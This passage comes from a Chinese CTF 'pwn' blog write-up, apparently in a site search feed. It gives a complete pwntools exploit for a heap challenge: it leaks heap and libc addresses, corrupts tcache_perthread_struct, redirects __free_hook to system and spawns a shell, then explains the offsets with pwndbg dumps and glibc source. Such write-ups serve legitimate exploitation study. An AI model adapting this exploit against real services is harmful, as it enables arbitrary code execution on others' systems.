<span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;Your choice: &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"><span class="comment">##get </span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">data = uu64(r(<span class="number">6</span>))</span><br><span class="line">lg(<span class="string">&#x27;data&#x27;</span>,data)</span><br><span class="line">heap = data - <span class="number">0x260</span></span><br><span class="line">lg(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"><span class="comment">##leak libc_base</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#9-15</span></span><br><span class="line"><span class="comment">##此时tcachebins为空，当再次申请chunk会将fastbins的chunk放入tcachebins中</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(heap+<span class="number">0x10</span>))<span class="comment">#16</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#18</span></span><br><span class="line"><span class="comment">##设置tcache_perthread_struct chunk的size对应的tcachebins为0xff，即让系统认为tcachebins中这个size处，已经满了</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">add(<span class="number">0x68</span>,payload)<span class="comment">#19</span></span><br><span class="line">show(<span class="number">19</span>)</span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">show(<span class="number">19</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">data =  uu64(r(<span class="number">6</span>))</span><br><span class="line">lg(<span class="string">&#x27;main_arena+96&#x27;</span>,data)</span><br><span class="line">libc_base = data - <span class="number">96</span> - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"><span class="comment">##malloc出来tcache_perthread_struct chunk使用去修改tcache_entry指针实现任意malloc</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>+p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">8</span>))<span class="comment">#20</span></span><br><span class="line"><span class="comment">##这段代码就是改tcachebins的0x20处的next指针指向__free_hook</span></span><br><span class="line"><span class="comment">##申请出上面这个0x20大小的chunk，改__free_hook为system</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))<span class="comment">#21</span></span><br><span class="line"><span class="comment">##b&#x27;/bin/sh\x00&#x27;覆盖了libc_base+libc.sym[&#x27;__free_hook&#x27;]-8，system覆盖了__free_hook</span></span><br><span class="line">delete(<span class="number">21</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<ol>
<li>tcache中的偏移，与存放chunk_size的大小</li>
</ol>
<p>疑问一：为什么这里<code>payload = b&#39;\x00&#39;*0x23+b&#39;\xff&#39;</code></p>
<p>在此处pwndbg中，tcache_prethread_struct的chunk内存，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x555555606000</span><br><span class="line">0x555555606000: 0x0000000000000000      0x0000000000000251</span><br><span class="line">0x555555606010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606030: 0x00000000ff000000      0x0000000000000000</span><br><span class="line">0x555555606040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606070: 0x0000000000000000      0x0000010000000000</span><br><span class="line">0x555555606080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#前面这一块内存记录的是tcachebins中对应size的chunk的数量，在0xff前面有0x23个\x00,它们记录了从0x10 - 0x240size的chunk，0xff的位置记录的是0x250大小的chunk,由于0xff导致0x250[-1]，以至于系统认为此处的chunk已满</span></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x70 [  0]: 0x10000000000</span><br><span class="line">0x250 [ -1]: 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//关于这个前0x40的内存，这里可以参考源码：</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//64 = 0x40</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//后面的就是tcache_entry,即每个tcachebins中记录的chunk_memptr</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>



<p>疑问二：<code>b&#39;\x00&#39;*0x40+p64(libc_base+libc.sym[&#39;__free_hook&#39;]-8)</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x555555606000</span><br><span class="line">0x555555606000: 0x0000000000000000      0x0000000000000101</span><br><span class="line">0x555555606010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606040: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#前面这些应该是记录tcachebins中每个size对应chunk的数量</span></span><br><span class="line"><span class="comment">#从这里开始往下应该是记录了每个size的chunk_memptr,最小的是0x20</span></span><br><span class="line">0x555555606050: 0x00007ffff7fc65a0      0x0000000000000000</span><br><span class="line">0x555555606060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606070: 0x0000000000000000      0x0000010000000000</span><br><span class="line">0x555555606080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060a0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><p>ctf-wiki，<a href="https://nightrainy.github.io/">知世</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
</search>
